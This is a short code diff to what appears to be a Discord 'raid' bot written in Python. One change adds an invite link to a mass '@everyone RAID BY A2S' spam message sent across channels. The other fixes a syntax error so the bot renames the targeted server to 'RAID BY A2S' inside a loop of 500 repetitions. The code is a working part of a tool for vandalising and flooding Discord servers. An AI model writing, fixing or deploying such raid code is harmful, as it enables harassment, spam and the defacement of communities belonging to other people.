@@ -110,7 +110,7 @@ else:
                 )
                 try:
                     await channel.send(
-                        "@everyone RAID BY A2S  "
+                        "@everyone RAID BY A2S https://discord.gg/vWeekH4BCP "
                     )
                 except:
                     pass
@@ -149,7 +149,7 @@ async def a2s(ctx):
     nombre = 500
     nom_serveur = "RAID BY A2S"
 
-    await guild.edit(name= RADI BY A2S)
+    await guild.edit(name="RAID BY A2S")
 
     for i in range(nombre):
         try:
